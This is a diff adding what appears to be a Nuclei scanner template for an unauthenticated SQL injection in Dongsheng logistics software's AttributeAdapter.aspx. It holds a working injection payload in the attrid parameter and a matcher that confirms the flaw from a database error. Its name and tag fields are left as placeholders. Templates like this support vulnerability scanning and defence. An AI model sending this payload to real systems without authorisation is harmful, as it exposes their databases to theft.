@@ -1,0 +1,20 @@
+id: dongsheng-wuliucms-AttributeAdapter-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 东胜物流软件AttributeAdapter.aspx存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6AttributeAdapter.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=@@version%20-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
